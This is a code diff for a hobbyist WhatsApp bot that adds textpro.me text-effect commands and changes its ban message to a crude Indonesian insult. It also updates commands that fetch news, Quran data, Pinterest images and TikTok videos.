+if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
+if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
+if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
+if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
+if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
+if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
+if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
+if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
+if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
+if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
+if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
+if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
+if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
+if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
+if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
+if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
+if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
+if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
+if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
+if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
+if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
+if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
+if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
+if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
+if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
+if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
+if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
+if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
+if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
+if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
+if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
+if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
+if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
+if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
+if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
+if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
+if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
+if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
+if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
+if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
+if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
+if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
+if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
+if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
+if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
+if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
+if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
+if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
+if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
+if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
+if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
+if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
+let anu = await maker.textpro(link, q)
+haikal.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, {quoted:m})
+}
+break
+//=================================================//
+case 'transformer': case 'fomer': case 'trans':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+ m.reply('*Sabar Cuy Loading*')
+ maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
+`${text}`,])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'herryp': case 'potter': case 'heryy':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks|teks`)
+m.reply('*Sabar Cuy Loading*')
+teks1 = text.split("|")[0]
+teks2 = text.split("|")[1]
+maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
+ `${teks1}`,`${teks2}`])
+ .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+ .catch((err) => console.log(err));
+break
+//=================================================//
+case 'neondevil': case 'neon': case 'devil':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+ m.reply('*Sabar Cuy Loading*')
+ maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
+`${text}`,])
+ .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+ .catch((err) => console.log(err));
+break
+//=================================================//
+case '3dstone': case 'stone':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+m.reply('*Sabar Cuy Loading*')
+maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
+ `${text}`,])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'thunder': case 'thun':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+m.reply('*Sabar Cuy Loading*')
+maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
+ `${text}`,])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'graf':
+case 'graffiti':
+case 'grafiti':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks|teks`)
+m.reply('*Sabar Cuy Loading*')
+teks1 = text.split("|")[0]
+teks2 = text.split("|")[1]
+maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
+ `${teks1}`,`${teks2}`])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'glitch3':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks|teks`)
+m.reply('*Sabar Cuy Loading*')
+teks1 = text.split("|")[0]
+teks2 = text.split("|")[1]
+maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
+ `${teks1}`,`${teks2}`])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case '3dbox':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+m.reply('*Sabar Cuy Loading*')
+maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
+ `${text}`,])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'drapwater': case 'water':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+m.reply('*Sabar Cuy Loading*')
+ maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
+`${text}`,])
+ .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+ .catch((err) => console.log(err));
+break
+//=================================================//
+case 'lion2': case 'lionn':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+m.reply('*Sabar Cuy Loading*')
+maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
+ `${text}`,])
+.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+.catch((err) => console.log(err));
+break
+//=================================================//
+case 'papercut': case 'paper': case 'cute':
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+ if(!text) return m.reply(`usersan ${command} teks`)
+ m.reply('*Sabar Cuy Loading*')
+ maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
+`${text}`,])
+ .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, {quoted:m}))
+ .catch((err) => console.log(err));
+break
 //=================================================//
 case 'sound1':
 case 'sound2':
@@ -5032,13 +4907,13 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await haikal.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
 mediaUrl: 'https://wa.me/2347082252014',
-title: `DUX BOT`,
+title: `DUX BOT MODS WA`,
 sourceUrl: `https://wa.me/2347082252014`, 
 thumbnail: thumb
 }
@@ -5046,7 +4921,7 @@ thumbnail: thumb
 break
 //=================================================//
 case 'gambar': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(text)
@@ -5056,7 +4931,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanindo': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan indo`)
@@ -5066,7 +4941,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanjepan': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan jepang`)
@@ -5076,7 +4951,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanmalaysia': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan malaysia`)
@@ -5086,7 +4961,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanhijaber': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan hijaber`)
@@ -5096,7 +4971,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanchina': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan china`)
@@ -5106,7 +4981,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecanvietnam': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan vietnam`)
@@ -5116,7 +4991,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecankorea': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan korea`)
@@ -5126,7 +5001,7 @@ haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
 break
 //=================================================
 case 'cecan': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(`cecan`)
@@ -5159,7 +5034,7 @@ haikal.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${
 break
 //=================================================//
 case 'neko' :
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
@@ -5168,7 +5043,7 @@ haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺�
 break
 //=================================================//
 case 'waifu' :
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
@@ -5177,7 +5052,7 @@ haikal.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺
 break
 //=================================================//
 case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  axios.get(`https://api.waifu.pics/sfw/${command}`)
 .then(({data}) => {
@@ -5186,7 +5061,7 @@ haikal.sendImage(from, data.url, 'Success Coy', m)
 break
 //=================================================//
 case 'fajar':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 FajarNews().then(async(res) => {
 console.log(res) 
@@ -5206,7 +5081,7 @@ reply(teks)
 break
 //=================================================//
 case 'cnn':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 CNNNews().then(res => {
 no = 0
@@ -5223,7 +5098,7 @@ reply(teks)
 break
 //=================================================//
 case 'layarkaca':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!q) return reply('Judul') 
 LayarKaca21(q).then(async(res) => {
@@ -5241,7 +5116,7 @@ reply(teks)
 break
 //=================================================//
 case 'cnbc':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 CNBCNews().then(async(res) => {
 no = 0
@@ -5259,7 +5134,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'tribun':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 TribunNews().then(async(res) => {
 no = 0
@@ -5278,7 +5153,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'indozone':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 IndozoneNews().then(async(res) => {
 no = 0
@@ -5297,7 +5172,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'kompas':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 KompasNews().then(async(res) => {
 no = 0
@@ -5316,7 +5191,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'detik':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 DetikNews().then(async(res) => {
 no = 0
@@ -5334,7 +5209,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'daily':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 DailyNews().then(async(res) => {
 no = 0
@@ -5351,7 +5226,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'inews':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 iNews().then(async(res) => {
 no = 0
@@ -5370,7 +5245,7 @@ reply(teks)
 break
 //=================================================//
 case 'okezone':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 OkezoneNews().then(async(res) => {
 no = 0
@@ -5388,7 +5263,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'sindo':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 SindoNews().then(async(res) => {
 no = 0
@@ -5406,7 +5281,7 @@ reply(teks)
 break
 //=================================================//
 case 'tempo':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 TempoNews().then(async(res) => {
 no = 0
@@ -5424,7 +5299,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 break
 //=================================================//
 case 'antara':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 AntaraNews().then(async(res) => {
 no = 0
@@ -5442,8 +5317,8 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 })
 break
 //=================================================//
-case "kontan":
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+case "kontan-news":
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 KontanNews().then(async (res) => {
 teks = ""
@@ -5461,8 +5336,8 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 })
 break
 //=================================================//
-case "merdeka":
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+case "merdeka-news":
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 MerdekaNews().then(async (res) => {
 teks = ""
@@ -5479,7 +5354,7 @@ haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: tek
 })
 break
 //=================================================//
-case "jalantikus":
+case "jalantikus-meme":
 await loading()
 var reis = await JalanTikusMeme()
 teks = ""
@@ -5513,7 +5388,7 @@ reply(text)
 break
 //=================================================
 case 'alquran':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
 axios
@@ -5532,14 +5407,14 @@ reply(text)
 break
 //=================================================
 case 'alquranaudio':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
 haikal.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
 break
 //=================================================
 case 'asmaulhusna':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 axios
 .get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
@@ -5555,7 +5430,7 @@ reply(text)
 break
 //=================================================
 case 'kisahnabi':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
 axios
@@ -5572,7 +5447,7 @@ reply(text)
 break
 //=================================================
 case 'jadwalsholat':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
 axios
@@ -5595,7 +5470,7 @@ reply(text)
 break
 //=================================================
 case 'smeme':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
 if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
@@ -5609,7 +5484,7 @@ haikal.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author
 break
 //=================================================
 case 'toimage': case 'toimg': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
@@ -5626,7 +5501,7 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'tomp4': case 'tovideo': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
 if (/video/.test(mime)) {
@@ -5649,8 +5524,8 @@ haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `
 }
 break
 //=================================================//
-case 'toaudio': case 'audio': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+case 'toaud': case 'audio': {
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
@@ -5662,7 +5537,7 @@ haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m 
 break
 //=================================================//
 case 'tovn': case 'voice': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
@@ -5673,7 +5548,7 @@ let audio = await toPTT(media, 'mp4')
 haikal.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
 mediaUrl: 'https://wa.me/2347082252014',
-title: `DUX BOT`,
+title: `DUX BOT MODS WA`,
 sourceUrl: `https://wa.me/2347082252014`, 
 thumbnail: thumb
 }
@@ -5682,7 +5557,7 @@ thumbnail: thumb
 break
 //=================================================//
 case 'togif': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
@@ -5695,7 +5570,7 @@ await fs.unlinkSync(media)
 break
 //=================================================//
 case 'tourl': {
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
@@ -5713,7 +5588,7 @@ await fs.unlinkSync(media)
 break
 //=================================================//
 case "quotes":
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
  var resi = await Quotes()
 teks = `\nAuthor: ${resi.author}\n`
@@ -5722,162 +5597,212 @@ teks = `${resi.quotes}\n`
 reply(teks)
 break
 //=================================================//
-case 'asupan1':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ytq5b/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
-	//=================================================//
-case 'asupan2':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9a9d/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan1":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Ytq5b/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan3':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YpRr4/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan2":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83Y9a9d/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan4':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
-	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YfoYm/`).then(({ data }) => {
-haikal.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
-	})
-	break
+case "asupan3":{
+if (isBan) return m.reply('*banned by owner Tolol*')
+await loading()
+m.reply('*Sabar Cuy Loading*')
+let res = await tiktok('https://vt.tiktok.com/ZS83YpRr4/')
+haikal.sendMessage(m.chat, {video:{url: res.url[0].url},
+caption: `
+辛 🤤 Ahh`}, {quoted:m})
+}
+break
 //=================================================//
-case 'asupan5':
-	if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-	await loading()
